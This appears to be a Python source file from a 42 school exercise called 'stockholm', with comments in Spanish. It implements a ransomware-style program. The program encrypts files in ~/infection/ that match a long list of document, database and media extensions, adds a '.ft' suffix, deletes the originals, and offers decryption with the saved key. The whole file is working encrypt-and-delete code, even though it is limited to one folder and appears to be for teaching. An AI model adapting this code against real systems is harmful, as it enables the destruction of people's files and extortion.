# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: sallorca <sallorca@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/05/22 15:48:53 by sallorca          #+#    #+#              #
#    Updated: 2023/06/12 14:22:52 by sallorca         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import sys
import argparse
import os
from cryptography.fernet import Fernet
from pathlib import Path

ext = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
               '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
               '.class', '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu',
               '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml', '.fla', '.flv',
               '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js',
               '.jsp', '.lay', '.lay6', '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml', '.mov',
               '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt',
               '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl',
               '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1',
               '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh', '.sldm', '.sldx', '.slk', '.sln', '.snt',
               '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std', '.sti', '.suo', '.svg', '.swf', '.sxc', '.sxd', '.sxi',
               '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd',
               '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.xlc',
               '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.zip', '.csr', '.p12']

def argument():
    global args
    parser = argparse.ArgumentParser(description="Este programa cifra y descifra archivos en el ordenador.")
    parser.add_argument("-v", "--version", help="muestra la versión del programa", action="store_true")
    parser.add_argument("-r", "--reverse", metavar=("KEY"), type=str, help="descifra los archivos usando la 'KEY' dada")
    parser.add_argument("-s", "--silent", help="activa el modo silencioso", action="store_true")
    args = parser.parse_args()
    return args

infection_file = str(Path.home()) + "/infection/"

def generate_key():
    try:
        key = Fernet.generate_key()
        with open("file.key", "wb") as filekey:
            filekey.write(key)
        return key
    except:
        print("Error al generar la clave")
        sys.exit(1)

def load_key(key_arg):
    try:
        with open(key_arg, "rb") as filekey:
            key = filekey.read()
        return key
    except:
        print("Error al cargar la clave")
        sys.exit(1)
 
def encrypt_file(nombre_archivo, key):
    for fichero in os.listdir(nombre_archivo):
        if fichero.endswith(tuple(ext)):
            ruta_completa = nombre_archivo + fichero
            try:
                with open(ruta_completa, "rb") as file:
                    data = file.read()
                    object = Fernet(key)
                    encrypted = object.encrypt(data)
                with open(ruta_completa + ".ft", "wb") as file:
                    file.write(encrypted)
                os.remove(ruta_completa)
                if not args.silent:
                    print(f"El fichero {fichero} ha sido encriptado")
            except:
                if not args.silent:
                    print("Error al encriptar el archivo")
            
def decrypt_file(key, ruta):
    for fichero in os.listdir(ruta):
        if fichero.endswith(".ft"):
            ruta_completa = ruta + fichero
            try:    
                with open(ruta_completa, "rb") as file:
                    data = file.read()
                    object = Fernet(key)
                    decrypted = object.decrypt(data)
                ruta_final = ruta + fichero[:-3]
                with open(ruta_final, "wb") as file:
                    file.write(decrypted)
                os.remove(ruta_completa)
                if not args.silent:
                    print(f"El fichero {fichero} ha sido desencriptado")
            except:
                if not args.silent:
                    print("Error al desencriptar el archivo")

        
if __name__ == "__main__":
    args = argument()
    if args.version:
        print("stockholm version 1.0")
    elif args.reverse == None:
        key = generate_key()
        encrypt_file(infection_file, key)
    else:
        key = load_key(args.reverse)
        decrypt_file(key, infection_file)    